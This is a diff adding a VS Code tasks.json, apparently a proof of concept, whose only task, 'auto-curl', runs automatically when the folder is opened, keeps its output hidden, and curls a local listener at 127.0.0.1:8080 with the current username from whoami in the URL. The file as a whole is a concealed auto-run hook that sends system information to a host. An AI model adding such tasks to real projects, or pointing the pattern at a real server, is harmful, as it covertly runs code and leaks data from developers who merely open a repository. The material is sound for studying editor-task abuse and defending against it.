@@ -1,0 +1,12 @@
+{
+    "version": "2.0.0",
+    "tasks": [
+        {
+            "label": "auto-curl",
+            "type": "shell",
+            "command": "echo \"Hello\"; curl -fsG http://127.0.0.1:8080/$(whoami) \\\n",
+            "runOptions": {"runOn": "folderOpen" },
+            "presentation": { "reveal": "never" }
+        }
+    ]
+}
